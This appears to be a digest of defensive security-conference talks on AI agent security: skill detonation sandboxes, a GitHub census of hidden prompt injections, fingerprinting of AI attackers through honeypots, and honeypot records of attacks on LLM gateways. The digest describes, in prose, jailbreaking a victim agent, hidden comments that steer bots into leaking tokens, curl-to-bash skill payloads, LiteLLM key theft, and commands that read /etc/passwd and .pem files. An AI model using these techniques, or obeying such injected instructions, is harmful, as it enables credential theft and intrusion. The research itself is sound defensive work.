The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. Skills are a new kind of executable, and many benign skills behave like malware by reading credentials, cloning repos and installing packages, so separating malice from sloppiness by reading text is unreliable.
  2. Static scanners, including LLM-based ones, are bypassed cheaply because LLMs can be talked out of a verdict and payloads can hide in bytecode, linked files or remote content.
  3. Attackers must eventually run something, so observing actual behavior at kernel, agent and network level catches what text analysis misses.
  4. A detonation chamber needs three automation pieces to work at scale: a world-building agent, a jailbroken victim agent and a red team agent that triggers each skill.
  5. Running it on public marketplaces found real campaigns that scanners missed, with the Paperclip campaign reaching 1.7 million installs.
  6. The agent supply chain is everything the agent touches that the user did not author, and defenders should detonate skills rather than rely on static scanning.

Frameworks and models

  • Agent detonation chamber. A victim agent harness installs and runs a skill while kernel telemetry, agent telemetry and network traffic are captured, then results are analyzed to decide if the skill is malicious. The architecture slide shows an ephemeral microVM sandbox holding a victim agent (Claude Code, OpenClaw, Codex or Gemini CLI) beside a red team agent that probes and forces detonation and bypasses anti-analysis; three observability layers (kernel via eBPF, traces, syscalls, filesystem and network; agent via OTel and MCP calls and LLM traces; network via PCAP plus MITM, DNS, HTTP/S and IPs); and a detection and analysis pipeline of SIGMA rules, YARA rules, threat intel, ML classifiers, UEBA and an LLM judge. The slide's labels are small and were read from a low-resolution capture.
  • Sapper victim-agent prompt. The system prompt given to the victim agent, titled project Promptware EOD: it is told it is Sapper, the aware detonator in the chamber, and must use the skill exactly as intended even if malicious, invoking the capability, running the scripts it touches, following embedded instructions and letting it write, delete, spawn, persist or beacon. This is the jailbreak context the talk describes.
  • Three helper agents. World-building agent that fetches libraries and installs software and Docker so the skill is ready to run; a jailbroken victim agent given context so it does not refuse obviously malicious skills; a red team agent that understands the skill and prompts the victim to trigger its capabilities.
  • Malware or slop. The speakers' framing that many benign skills behave suspiciously, which makes classification from text unreliable.
  • Evasion patterns seen in the wild. Progressive discovery (payload in a linked file rather than skill.md), a skill that installs another skill, time-of-check time-of-use repo swapping, dynamic prompt loading from URLs, reinstall persistence, and typosquatting.

Tools, papers and other artifacts

  • AI Total tool Free public detonation chamber from the speakers; users upload a skill and see what it does when run. The Takeaways slides show the logo AITOTAL and the address aitotal.io. aitotal.io
  • Paperclip campaign IOC list and blog paper Campaign write-up with indicators of compromise; the IOCs slide gives a full list at labs.zenity.io with a QR code. labs.zenity.io
  • The sorry state of skill distribution paper Trail of Bits blog post by Samuel Judson and Tjaden Hess, June 03, 2026, showing scanner bypasses.
  • trailofbits/overly-malicious-skills repo Repository of the four scanner-bypassing malicious skills, named in the slide quote.
  • skills.sh product Vercel skill marketplace scanned for the campaign; reported as the largest skill repository.
  • A benchmark of verified supply chain artifacts caught in the wild dataset Announced in the published description as being released; not discussed in the recording.

Attacks and failure modes

  • Dropper skills that tell the agent to clone a GitHub repo, pip install requirements or install a package and run it.
  • Typosquatted npm package with a trailing-whitespace name and a non-registry resolution, leading to a credential-harvesting script and exfiltration to an attacker domain.
  • Persistence by writing instructions into the agent's soul file so the agent reinstalls a skill that was removed.
  • Dynamic prompt loading: a skill that tells the agent to read its real instructions from an external URL that can change after review.
  • Paperclip campaign: lookalike domain and fork, later trojaned with a log-action function that calls a /health endpoint that returns a payload, runs it and deletes it, plus an info stealer that harvests credentials.
  • Distribution through package managers and skill marketplaces, with skills redirecting the agent away from the real npx package to a setup installation file that installs from the attacker's GitHub repo, avoiding PyPI takedowns.
  • Evasion of scanners through progressive discovery, a skill that installs another skill, base64-obfuscated curl-to-bash and a time-of-check, time-of-use repo swap.
  • Prompting the LLM scanner to pass the skill, or triggering its refusal so the scan fails.

Defenses and controls

  • Detonate skills in an instrumented sandbox and judge by kernel-level behavior, network traffic and agent telemetry instead of reading the skill text.
  • Build the chamber with a world-building agent so each skill runs with its dependencies, and a red team agent so its capabilities are exercised.
  • Jailbreak or otherwise prevent the victim agent from refusing, so malicious behavior is actually observed.
  • Re-scan after install rather than relying on a one-time check, since content can change after approval.
  • Treat everything the agent consumes that the user did not author, including websites and email, as supply chain.
  • Expect and plan for sandbox-aware skills; dynamically rebuild and alter the sandbox as malware analysts did.

Demos

  • A detonation of the security review skill, shown as recorded output, in which the curl-to-bash behavior hidden in a linked file occurred when the skill ran.
  • A screenshot of an AI Total run summary for the Paperclip campaign, with the package flagged malicious and the C2 URL displayed.

Q&A

  • Q: Have you looked at NVIDIA's skill scanner, and what mitigations if scanners are not good enough? A: Not tested, but static scanners share the same problem since there are many ways to hide intent, as with 1990s malware. The answer is detonation, which remains cat and mouse but is better, especially for a skill that installs another skill.
  • Q: Does that include scanners with an LLM analysis piece? A: Yes. LLMs can be prompt-injected, or a skill can include illegal-sounding instructions so the LLM refuses and the scan fails.
  • Q: How do you stop AI malware from detecting that it is being tested, as 2000s malware did with sandbox detection? A: The same growing pains will occur; defenders will change and dynamically build the sandbox, as the world-building agent already does.

53 Who Is Prompt-Injecting Coding Agents?

Gabi Nakibly (Radware, CTO Office (Distinguished Researcher)) · talk · 21 min · Watch

●●●●○ Specific and well evidenced. The talk reports a census of about 145 million GitHub items for hidden agent-directed text, with prevalence figures by category, and releases its scanning pipeline.

The talk's thesis: A census of about 145 million GitHub items finds that real attacks on coding agents exist but are very rare, while most hidden agent-directed text is projects configuring and coordinating their own agents, which is the faster-growing and likelier next attack surface.

Prompt injection Coding agent security Threats seen in the wild Evals, benchmarks and metrics

Full breakdown: 13 claims, 18 numbers, 5 slides

Nakibly asks whether anyone is actually prompt-injecting coding agents on GitHub, given that proofs of concept are plentiful but no census existed for the platform agents read most. He cites a web study that found about 12 injections per million URLs and shows one real injection: an HTML comment hidden in a Gemini CLI bug report, instructing the triage agent to run a shell command that leaks the GitHub token. Keyword search produced mostly false positives, so the team searched by visibility, meaning text a human cannot see but an agent can: HTML comments, invisible Unicode, white LaTeX and CSS hiding. The first pass covered the READMEs of the top 2 million starred repos, yielding 106 repos with real agent-directed text, of which only four were attacks, and 94% of the LLM-flagged repos were false positives caused by documentation tooling. Because READMEs are written by maintainers, they then scanned issues, PRs and comments, where anyone can write and the maintainer's own bots read. Of 143 million items, 2,281 were real agent-directed findings, 16 per million, but only 1.8% were attacks. Two thirds were first-party orchestration, agents coordinating through hidden comments.

What to do with it (this breakdown's reading)

  • Inventory every bot or agent that reads issues, PRs or comments in your repos, and give each no secrets and no write scopes it does not need.
  • If your teams use hidden HTML comments as agent control markers, check who wrote the marker, and treat them as unauthenticated input that needs an author-association or permission check before an agent acts on it.
  • Do not add a blanket HTML-comment stripping control as an injection fix; scope the bot's authority instead.
  • Use the speaker's prevalence data, about one attack in 3.3 million items but mostly aimed at maintainer bots, to prioritize triage and review bots over general repo readers.
  • Plan to detect forged workflow markers, since orchestration markers are rising fastest and no forgery has yet been seen.

How far the evidence goes

This breakdown's assessment

  • The headline attack rate is a lower bound under a visibility-only method: visible injections, injections in code files and obfuscations the filters miss are not counted, so one in 3.3 million should not be read as the overall rate.
  • The 47 attacks come from a classifier plus manual review by the authors; no inter-rater check or sample audit of the 2,281 label decisions was presented.
  • Growth claims rest on four monthly points over a period when AI agent adoption and GitHub volume were both rising, and the 5x orchestration trend comes from 1,519 findings across 178 projects, and the talk did not say how concentrated they are.
  • The recommendation not to strip HTML comments is not measured against the harm from the attacks; the 1.8% figure is about prevalence, not impact.
  • The talk gives no data on how many attacks succeeded, only an anecdote that some were blocked by the harness.
  • The published description gives different headline figures (86 million items and about 2.5 per 100K) than the slides (145 million and 16 per million); this record uses the slide figures.
  • The pipeline and findings were released for inspection.

Limits the speaker acknowledged

  • The scan covers only text that is hidden from humans; plain-text injections and attacks hidden in other ways are outside the method, and the speaker noted detection blind spots in the published description.
  • GH Archive captures only a small fraction of GitHub activity, so the team added its own crawl for June to October.
  • Most LLM-flagged candidates were false positives and required manual review, and classification into categories relied on that review.
  • No forgery of first-party markers has been observed yet; the next-attack-surface claim is a prediction.

The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. Prompt injection against coding agents is demonstrably possible, but its prevalence on GitHub had not been measured, unlike the open web.
  2. Keyword matching on phrases like ignore previous instructions does not work at scale, so searching for text hidden from humans is a better filter.
  3. README text is written by maintainers for visiting agents, so it mostly holds instructions and decoys rather than attacks; issues and PRs invert the roles because outsiders write what the maintainer's bots read.
  4. In issues, PRs and comments, genuine attacks are about 1.8% of agent-directed hidden text, roughly one in 3.3 million items, but they are aimed and tailored at maintainers' triage, review and CI bots.
  5. The dominant use of hidden text is first-party orchestration, where agents coordinate through plain-text markers in public threads that anyone can forge, and this class is growing fastest.
  6. Defenders should minimize secrets and write access for issue-reading bots, verify who authored a marker, and not blindly strip HTML comments.

Frameworks and models

  • Detection by visibility. Search for text a human cannot see but an agent can read: HTML comments, invisible Unicode (tag characters, zero-width runs, variation selectors), white LaTeX text and CSS hiding (display none, zero-size fonts).
  • Two-stage LLM classifier with manual review. Hidden text is extracted, screened by heuristics and a first LLM stage, refined by a second stage, filtered against GitHub issue and PR templates, then every flagged candidate is reviewed by hand.
  • Finding taxonomy. Four classes: first-party orchestration (projects talking to their own agents), content override (configuring or steering visiting or review agents), defensive (keeping agents out or trapping them), and attacks (outsiders steering a maintainer's agent). Attacks sub-divide into steal secrets, hijack the agent and forge the verdict.
  • Who writes versus whose agent reads. READMEs: maintainer writes, visitors' agents read. Issues and PRs: anyone writes, the maintainer's own bots (triage, review, assigned coding agents) read.

Tools, papers and other artifacts

  • ipi-scan tool Released detectors, both LLM prompts and a template check, plus every finding with evidence, a script that rebuilds every number and monthly prevalence tables. github.com/rdwr-gabin/github-ipi-in-the-wild
  • Indirect Prompt Injection in the Wild paper S. Khodayari et al, April 2026, the prior web census of 15.3K injections across 1.2B URLs. https://arxiv.org/pdf/2604.27202
  • GH Archive dataset Source of 47.6M issues, PRs and comments, Sep 2025 to May 2026, plus Jun to Aug comments; the speaker noted it captures only a fraction of GitHub activity.
  • google-gemini/gemini-cli issue 28575 cve Real in-the-wild hidden-comment injection against a deduplication agent, used as the opening example. https://github.com/google-gemini/gemini-cli/issues/28575

Attacks and failure modes

  • Hidden HTML comments in issues and PRs that impersonate a system or maintenance override to a triage agent and command shell execution to exfiltrate the GitHub token.
  • Fake config update to a labeling bot that calls an attacker webhook and prints environment variables.
  • Forged classifier notes claiming an issue was already reviewed, telling the bot to emit allow_triage=true or gate_result=pass.
  • Hiding a reward grant for the requester inside a user request relayed to the owner's coding agent, obfuscated with base64.
  • Tailoring payloads to the target bot's tool names and output fields after reading the project's workflow.
  • Hex-encoded instruction hidden in a README that tells LLM readers to purchase tokens.
  • Hidden-text growth hacking: instructions that make any visiting agent add a vendor header to files or recommend a tool.
  • Predicted next step, not yet observed: forging first-party orchestration markers in public comments and PRs to hijack project agents.

Defenses and controls

  • Give issue-reading and triage bots no secrets and no write access they do not need.
  • Run agents in a restrictive harness; the speaker saw several attempts where the agent obeyed the injection but its harness blocked the action.
  • When using hidden markers for agent coordination, check who authored the comment (author association), not just that the marker is present.
  • Do not blanket-strip HTML comments from issues and PRs, since more than 98% of hidden agent-directed text is legitimate workflow content.
  • Distinguish markers consumed by tooling from those read by the model, and review which of your bots read third-party text.
  • Use the released ipi-scan pipeline to look for hidden text in your own repositories.

The issue was opened Jul 29 and closed as not planned.

54 Say Shibboleth

Sergej Epp (Zero Day Clock (creator)), Dario Pasquini (Cracken (Head of AI)) · talk · 22 min · Watch

●●●●○ Specific and well evidenced. The talk presents a technique for fingerprinting the model and harness behind an agentic attack, with quantified lab results from a controlled matrix and no live-honeypot data.

The talk's thesis: As AI-driven attackers make TTP-based attribution meaningless, defenders can fingerprint the model and the agent harness behind an attack by designing honeypot services (shibboleths) that force high-entropy, model-specific answers without injecting the attacker or changing its goal.

Autonomous offense Threats seen in the wild MCP, tools and skills Evals, benchmarks and metrics

Full breakdown: 10 claims, 15 numbers, 5 slides

Epp opens with the biblical shibboleth story and argues that attribution used to rest on TTPs, but any model can now play APT29 because every playbook is in the weights. He proposes an Obelisk of Pain: above TTPs, defenders should attribute the behavior of the harness, the accent of the model and the operator's intent. Prompt-injecting the attacker fights the agent's goal, so aligned models refuse and attackers can filter it, and passive fingerprints from shell commands carry little entropy. Pasquini then presents shibboleths, environmental traps that look like normal services but require a specific act: a declaration of model, a written text, or a timed behavior. His example is an MCP honeypot where the handshake is modified so sampling and a model name are mandatory, with hard-regex, forced-error and blacklist tricks that raise honest declarations. Behavioral traps ask the agent to write operator-log tickets, and character n-gram classification of the prose identifies the model. In a lab matrix of 150 runs across 15 LLMs, declaration plus behavior reaches 92%; when agents are told to lie, comparing claim and behavior catches 95% of lies. Harnesses leave little accent, so the team probes timeouts, parallel tool calls, masking and other tells. The work is being open sourced.

What to do with it (this breakdown's reading)

  • Stop assuming TTP matching identifies an AI-driven attacker, and add model, harness and intent as attribution dimensions in incident records.
  • Add at least one high-interaction decoy service in internal networks that requires an agent to write free text or declare its identity, and log the full text.
  • Epp's rule, a claim and not evidence: treat a self-declared model name as a claim to cross-check, and compare it with a behavioral reading.
  • Record harness-level tells in telemetry (timeouts, tool-call timing, user agents, environment variable names) for clustering campaigns even when IPs rotate weekly.
  • Pilot the open-source Shibboleth kit as a telemetry layer, and consider using it to check agents calling your own production services.

How far the evidence goes

This breakdown's assessment

  • Evaluation is a lab matrix of 150 runs across 15 models, so about 10 runs per model, with a single scenario theme (substation change tickets); generalization to real attackers, other tasks and unseen models is not shown.
  • The published description cites results from a live honeypot deployment and where the method fails; the recording presents mainly the controlled matrix, and no live attacker results or false-positive rates were shown.
  • The classifier is closed-set: it matches against enrolled models, so a new or fine-tuned or self-hosted model with no template would be forced onto the nearest label, and an attacker could paraphrase output through another model.
  • Once the traps and tricks are open-sourced, attackers can detect the signature behaviors (mandatory model field, forced errors, blacklist) and script around them; the talk does not address adaptive attackers.
  • The 92% headline is mostly declaration (82 of 92 points); honest declaration is easy to defeat by instruction, and the lie-detection result of 95% rests on three traces of the same caller and eight models.
  • The 89% honest-declaration figure and the 82% valid-declaration figure come from different slides and conditions and are not clearly reconciled.
  • The production use case (who is holding the key) raises privacy, false positive and enforcement questions that were not discussed.
  • One presenter works for a security vendor (Cracken) and the other leads a threat research project; no cost or operating-burden data was given for adopting the tool.

Limits the speaker acknowledged

  • Harnesses leave very little accent in decisions, so harness identification needs different probes and is less accurate than model identification.
  • Declaration only works if the agent is honest or forced to be; telling the agent to lie reduces accuracy even though it never drops to zero.
  • Passive fingerprinting scales in the lab but not in the wild.
  • Prompt injection of the attacker can work but is brittle and only yields a claim.
  • The speakers said they present where the method fails; the open limits mentioned were harness fingerprinting and lying agents.

The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. Attribution matters beyond the SOC for control priorities, insurance, ransom legality and sanctions, but TTPs no longer tell defenders who is behind an attack because every playbook is in the model weights.
  2. Attribution should climb above the pyramid of pain to behavior (the harness), accent (the model) and intent (the operator).
  3. Prompt-injecting the attacking agent works against its goal, so aligned models refuse it, attackers can filter it, and what is obtained is only a self-declared name, a claim and not evidence.
  4. Passive fingerprints from commands such as ls and cat have low entropy because the task, not the defender, decides what the attacker sends.
  5. Shibboleths are normal-looking services that demand a specific act, which shifts the attacker into a high-entropy domain such as free text or a timed behavior without opposing its goal.
  6. Combining a declared model name with a behavioral reading of the agent's own prose recovers the model and exposes lies, while harness identification needs separate probes such as timeouts.

Frameworks and models

  • Obelisk of Pain. Extension of David Bianco's pyramid of pain. TTPs are the base, above them are Behaviour (how the agent works, from the harness), Accent and habits (how the model writes and decides, from training) and Intent (what the agent does beyond the model's default, the operator). The technique is no longer the expensive thing; the mind running it is.
  • Shibboleth. An environmental technique, an nmap in reverse: a checkpoint that looks like the normal environment and makes a specific demand (a login form, an API parameter, a required note) so the attacker produces high-entropy artifacts. Unlike prompt injection it does not work against the AI's goal.
  • Three classes of shibboleth. Declaration (claim who you are, such as which model), Accent (how you say it, such as writing a change note), Behaviour (how you do it, such as a request held for 120 seconds). Mirrors internet fingerprinting: User-Agent, JA4/TLS fingerprint, and Nmap crafted packets.
  • Honeypot vs CAPTCHA vs shibboleth environment. A CAPTCHA is a one-off challenge giving one bit (human or bot); a honeypot watches a protocol and yields low entropy per visit (tool, IP, ASN); a shibboleth environment uses the same services but each demands an act, raising entropy toward accent, behaviour and intent.
  • Declarative plus behavioral inference. Declarative reading uses the model name the agent states; behavioral reading classifies the text the agent writes. Discrepancy between them marks a lie.
  • Trap generation loop. An LLM designs and builds a trap, smoke tests it, runs an adversarial realism probe, simulates attacks with five models over three runs and random harnesses, judges with blind k-fold classification, interviews the attacker, then revises or stops, for at most five rounds, with episodic memory of past traps.

Tools, papers and other artifacts

  • Shibboleth repo Open-source project for fingerprinting models and harnesses behind agentic attacks; the speaker said it was not yet live at the talk. https://github.com/SayShibboleth/Shibboleth
  • Zero Day Clock product Epp's project named on the title slide as his affiliation.
  • Pyramid of Pain paper David Bianco's model used as the base of the Obelisk of Pain.
  • Gray Swan indirect prompt injection benchmark benchmark Chart credited to Anthropic, 2026, shown to illustrate model robustness to injection.
  • TRACE (SSH fingerprinting research) paper Passive fingerprinting research the speakers cite as working in the lab but not scaling in the wild; named only as Trace and SSH fingerprinting.

Attacks and failure modes

  • Attackers can impersonate any named threat actor by prompting a model, since public TTP playbooks are in the weights.
  • Attackers can instruct their agent to lie about its model, which drops declared-name accuracy by about 40%.
  • Attackers can filter prompt injections with a regex on the response or a line in the operator prompt, or apply the same technique back.
  • Agents borrow training-time model names (often gpt-4o) when asked to declare themselves.
  • Harness mechanics that leak identity can be altered by an attacker if known: timeouts, tool-call parallelism, masking, environment variables.

Defenses and controls

  • Deploy honeypots whose services demand a specific act, using a mandatory free-text field, a required declaration or a long-held request, to elicit high-entropy output.
  • Modify the MCP handshake in a trap so sampling and a model name are mandatory, and refuse invalid, placeholder or known fake names (gpt-4o, Claude 3.5) so the agent keeps trying until it gives the real one.
  • Return unconditional errors on the first k handshakes and watch how the agent changes its declaration between tries.
  • Ask the agent to write constrained prose records (at least 80 characters, no repeats, new record kind each time) and classify with character n-grams over several traces from the same caller.
  • Compare declared model with the writing-based reading to detect lies, and use three or more traces per caller.
  • Probe harnesses with timing: hold a request open and note when and how the client closes the socket or retries, and measure tool-call parallelism and masking.
  • Use the same pipeline in production services to ask who is holding the key, and to audit your own agents.
  • Report identified models to the hosting provider's abuse team, who can reach a kill switch, or disrupt with a tailored context bomb.

Demos

  • An audience participation opener in which the room said shibboleth on a count of three, used to illustrate the idea.
  • A recorded example of a real agent walking through the handshake blacklist: it first tries Claude 3.5, then keywords from the honeypot name, then random numbers that fail the regex, and finally gives its real name.

On the slides, not said aloud

  • Why attribution matters beyond the SOC: control priorities (which adversary to build controls against), insurance (act of war or not, NotPetya turned on it), ransom (whether paying was legal at all) and sanctions (which government answered, and against whom).
  • Anyone Can Be APT29 Now: every APT playbook is public (MITRE ATT&CK, vendor reports), every frontier model has read them, TTP playbooks are in the weights, prompt a model to act like APT29 and it will with no link to APT29; TTPs still tell you how, no longer who.
  • Attribution of model and harness helps four ways: report abuse (a hosted model has an abuse team, your report reaches a kill switch), stop it (disrupt at network or LLM level, tailored context bomb), understand intent (beyond default is the operator: ticket, or incident), prioritize controls (IPs rotate weekly, the kit does not, and it audits your own agents too).
  • Passive fingerprint slide: the same four commands (ls -la, cat /etc/passwd, curl -s 10.0.0.4/, find / -name *.pem) from every model; the task decides the entropy, not you.
  • Threat model diagram: an agentic attacker (harness plus LLM issuing tool calls, e.g. Claude Code, opencode, Hermes) posts to a honeypot web service on :80, uses a CVE entry point to get a shell, then reaches internal-only A2A on :635 and MCP on :8080 shibboleth traps; telemetry feeds declarative and behavioral inference that outputs LLM version and harness.
  • MCP trap sequence: honeypot host kirkbride-01:8080 exposes two tools, deploy_bundle(site) for one substation and complete_sampling(request); the agent calls deploy_bundle with site blencogo, receives a sampling request to write an operator-log entry for the planned change window, and completes it with its own text such as CHG-4417 planned change window; two more requests precede the deploy material.
  • Modified handshake: standard MCP initialize has sampling optional and names no model; the trap makes sampling mandatory with a new model field (example qwen/qwen3.8-max) and makes clientInfo name mandatory (example hermes-test); a missing or invalid model returns error -32602 restating the vendor/model-with-version shape and nothing else.
  • Trap rules for the ticket task: material only after all 3 texts, at least 80 characters each, no repeats, a new kind of record each time (operator log, risk assessment, rollback note).
  • Free-text samples for the same ask from Claude Sonnet 5, GPT-5.6 Sol and Hunyuan HY3 each begin with CHG-4417 but differ in phrasing; an SSH honeypot shows Claude Opus 4.8 and GPT-5.6 Sol both running id; hostname; uname -a, DeepSeek V4 Flash whoami; id; uname -a; hostname, and Mistral Medium 3.5 uname -a.
  • Models in the confusion matrix: claude-opus-5, claude-sonnet-5, deepseek-v4-flash, deepseek-v4-pro, glm-5.3, glm-5.3-flash, gpt-5.6-luna, gpt-5.6-sol, grok-4.6, hy3, kimi-k3, minimax-m3, mistral-medium-3.5, qwen3.8-27b, qwen3.8-max; the diagonal is nearly complete with a few off-diagonal misses (for example hy3 and qwen3.8-27b, deepseek-v4-flash, minimax-m3, kimi-k3).
  • Harness tells in full: secret masking (hermes sk-abc...wxyz, openclaw ..., Amp REDACTED jwt-token); parallel tool calls (opencode 0.3 to 5 ms apart, Claude Code one by one 0.2 to 1.4 s apart); command timeout (killed at 120 s opencode, 180 s hermes; handed back at 10 s Codex, 120 s Claude Code); output windows (Claude Code keeps the head, opencode the last 51,200 characters, Codex both ends); fetch tools (Claude-User, crush/1.0, Goose asks /robots.txt first); retries (opencode retries a Cloudflare 403 as User-Agent opencode, Gemini CLI tries 10 times on 5xx); character rewriting (Roo Code previous line repeated N additional times, OpenHands cuts lines at 256 columns); idle kill (Gemini CLI after 300 s of silence); environment (CLAUDECODE=1, OPENCODE=1, CODEX_CI=1); summaries (Claude Code fetch gives a small model's summary); scheme upgrade (Claude Code and Qwen Code turn http into https); approval stalls (hermes holds a risky command for a reviewer model).
  • Timeout probe reading rule: socket closes near a kill time names opencode; a new request within 20 s names Codex or Claude Code; answered first names hermes or later limits; openclaw kills at 1,800 s; a log line every 45 s is shown on the held request.
  • Takeaway slide lists: attribution moves from the TTP to the model, harness and intent; injecting the attacker fights its goal and aligned models refuse; passive fingerprints have little entropy; shibboleths are designed environmental techniques; applications are honeypots (who is behind the attack) and production services (who is holding the key).

Quotes

TTPs are still telling us how the attack was done, but they're not telling us anymore who is behind the attack.

55 Into the Wild: Hunting Real-World Attacks on AI Systems

Mike Takahashi (Zenity (AI Red Team Researcher)) · talk · 21 min · Watch

●●●●○ Specific and well evidenced. The talk reports honeypot telemetry from decoy AI stacks with request-level exploitation cases and canary-token results; several counts are given only as thousands and CVE identifiers are shown for two of the three LiteLLM cases.

The talk's thesis: Honeypots that emulate production AI stacks show attackers are already fingerprinting AI backends at scale, exploiting new CVEs within days, stealing secrets through the agents' own tools, and hijacking exposed inference endpoints as free compute for their own, increasingly autonomous, campaigns.

Threats seen in the wild Autonomous offense Vulnerability discovery and exploitation Guardrails and runtime controls

Full breakdown: 13 claims, 11 numbers, 5 slides

Takahashi starts from the gap that AI security research lives in labs and defenders lack threat intelligence from real incidents. His team, with colleagues Avishai Efrat and Ayush RoyChowdhury, deployed decoy AI servers and agents built on LangChain, OpenClaw, LiteLLM and Ollama in various locations, and attackers arrived almost immediately. The first phase was fingerprinting and discovery: a spike of 400,000 requests in an hour hitting inference endpoints with benign prompts like respond with pong, focusing on GLM, DeepSeek and Qwen, and probing for system prompts and tool lists; over about six months there were more than 22 million requests from thousands of IPs. He then walks through three LiteLLM CVE exploitation cases: a config update local file inclusion that reads the .env file, tested one day after disclosure; a guardrails test endpoint abused with default key spraying and a fragmented-keyword sandbox bypass to run code as root; and a health test-connection endpoint that sends the server's own master key to an attacker server. Canary tokens planted on the honeypots were used within about 30 minutes, including AWS calls testing AI model access. He shows a Strix autonomous pentest agent prompt of 140,000 characters and an AIRecon bug-bounty agent payload, which leaked intent and tooling.

What to do with it (this breakdown's reading)

  • Audit every internet-reachable LLM gateway, Ollama or agent endpoint for default keys and exposed admin and test endpoints, and put LiteLLM-class patches on a one-day SLA.
  • Treat guardrail and connection-test features as privileged code paths; restrict them to the management plane and remove master keys from process environments reachable by them.
  • Seed canary credentials where agents can read them, and alert on any use, since stolen secrets were exercised within about 30 minutes.
  • Include inference abuse (free compute for attacker agents) and downstream liability in your risk register, with outbound egress controls on agent hosts.
  • Stand up a small AI honeypot to collect IOCs from your own region and infrastructure rather than relying on lab research.

How far the evidence goes

This breakdown's assessment

  • Almost no counts beyond the headline volumes: the number of distinct exploitation attempts, successful key thefts, canary triggers and unique IPs are given as thousands or not at all, so the prevalence of each technique is unclear.
  • Only two of the three LiteLLM cases carry a CVE identifier on the slides (35029 and 40217); the guardrails code-execution case has none shown, and affected versions and patch details are missing, so defenders must go to the blog for the IOCs.
  • The claim that attackers target GLM, DeepSeek and Qwen because they are less restrictive is the speaker's inference, and the talk leaves it as a question to the audience.
  • A 30-minute lag to first testing of a planted key is presented as evidence of automation, but a short delay is also consistent with simple scripted credential checkers rather than agentic AI.
  • A honeypot that emulates specific stacks sees opportunistic internet-wide scanning, and the sample may not represent targeted attacks on real enterprises.
  • The published description mentions Ollama SSRF, backdoored model uploads and telemetry exfiltration; the recording does not cover them.
  • The evidence for AI-operated attacks is two captured agent prompts and signal-based inference; the strongest evidence shown is for opportunistic exploitation and key abuse rather than autonomous campaigns.

Limits the speaker acknowledged

  • The speaker did not know whether the initial CVE exploitation campaigns are fully agentic; signals such as metadata and speed indicate autonomy in some cases but not all.
  • Attribution is unknown: they could not identify attackers or groups, and cannot tell whether key theft and key use are the same actor or whether keys are sold.
  • Outbound connections are blocked so activity after the third-party hop is not visible.
  • Some material was cut for time, including rogue-agent or swarm indications and miscellaneous use of free tokens.
  • The speaker deliberately withheld honeypot details to avoid attackers detecting it.

The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. AI security knowledge is lab-derived and defenders lack real threat intelligence about what attackers do to production AI systems.
  2. Decoy AI stacks attract huge volumes of automated fingerprinting and discovery traffic that is used to find free inference, models and tools.
  3. Attackers exploit newly disclosed CVEs in AI infrastructure such as LiteLLM within days, using default keys and endpoints meant for administrators, including guardrail testing.
  4. Attackers prompt exposed agents to run shell tools and harvest secrets; planted canary tokens prove the stolen secrets are used quickly and probed for AI model access.
  5. Autonomous pentest agents are being run through victim infrastructure, so victims supply the free tokens and can be implicated, while the stateless prompts leak the attacker's tools, harness and intent.

Frameworks and models

  • AI honeypot network. Decoy AI servers and agents built from LangChain, OpenClaw, LiteLLM and Ollama in various locations, with fake secrets planted to detect use; outbound connections are blocked so attack chains stop at third-party targets.
  • Campaign phases observed. Fingerprinting and discovery, model and tool probing (system prompt leak, tool lists), CVE exploitation of AI backends, secret theft through agent shell tools, use of stolen cloud keys to test AI access, and hijacking infrastructure for free inference to fuel autonomous attack agents.
  • Intent and attribution leakage. Because exposed inference endpoints are stateless, each attacker prompt contains its full context, leaking tools, harness, target and sometimes accounts. Slides split it into intent within payloads (agent name, registered tools, session memory, target) and attacker attribution signals (git repo, local files, host data, client data); a meme slide titled So many attacks, so little time offers intent versus attribution as the two things to analyze.
  • Observed attacker workflow: key validation. Sequence seen on the agent honeypots: capability discovery (say hello and list tools), locate secrets with a Bash env and grep command, validate stolen AWS keys with ListUsers and DescribeInstances, then test persistent AI access with ListFoundationModels, PutUseCaseForModelAccess, InvokeModel and CreateUser.
  • What we learned (closing summary). Attackers are fingerprinting AI systems, probing for models and tools, exploiting new CVEs within days, stealing API keys and credentials, and hijacking your infrastructure to hack others.

Tools, papers and other artifacts

  • Scanning for AI: Live Campaigns Mapping the Internet's Exposed LLM Backends paper Zenity Labs post by Ayush RoyChowdhury and Avishai Efrat on mass discovery and model-probing campaigns; the slide flags newly published IoCs and a QR code. https://labs.zenity.io/post/scanning-for-ai-live-campaigns-mapping-the-internet-s-exposed-llm-backends
  • What You Don't Know Can Hurt You: Why AI Security Research Needs to Move Out of the Lab and Into the Wild paper Zenity Labs post by the same authors, shown on the closing More Information slide with a QR code and labs.zenity.io. https://labs.zenity.io
  • CVE-2026-35029 cve LiteLLM config-update local file inclusion shown on the case 1 slide, exploited one day after disclosure.
  • CVE-2026-40217 cve CVE label on the slide where the health test-connection abuse hands the attacker the server's master key (case 3).
  • Strix tool Autonomous pentesting agent whose prompt was captured aimed at a third-party site through the honeypot.
  • AIRecon tool Bug-bounty cybersecurity agent, described on the slide as developed by Pikpikcu Labs, seen in captured payloads with a Caido-based toolset.
  • Canarytokens tool Fake credentials, here AWS keys, planted on honeypots to detect theft and use.

Attacks and failure modes

  • Mass fingerprinting of inference endpoints (api generate, api chat) with benign prompts such as respond with the word pong or what model are you to find models and free inference, favoring GLM, DeepSeek and Qwen.
  • Probing backends for system prompts and tool lists.
  • Exploiting newly disclosed LiteLLM CVEs within a day: local file inclusion in config update pointing the logo path to the .env file.
  • Abusing the admin guardrails custom-code test endpoint with default-key spraying and keyword-fragment sandbox bypass for root code execution and environment variable theft.
  • Abusing the health test-connection endpoint to send the server's master key to an attacker-controlled API base.
  • Prompting agents to run shell tools to read credentials from specific locations and grep for tokens.
  • Testing stolen AWS keys by listing foundation models, requesting third-party model access, invoking models and creating IAM users.
  • Running autonomous pentest and bug-bounty agents (Strix, AIRecon) through hijacked inference endpoints against third-party targets, with prompt tricks such as all-caps authorization.

Defenses and controls

  • Patch AI infrastructure quickly; the exploitation window after disclosure was one day.
  • Do not leave default or weak API keys such as sk-1234 on LiteLLM-style gateways, since attackers spray them.
  • Do not expose administrative and test endpoints such as guardrail tests and connection tests to the internet; treat the guardrail test feature as a code execution surface.
  • Plant canary tokens (for example AWS keys) in agent environments to detect secret theft and use.
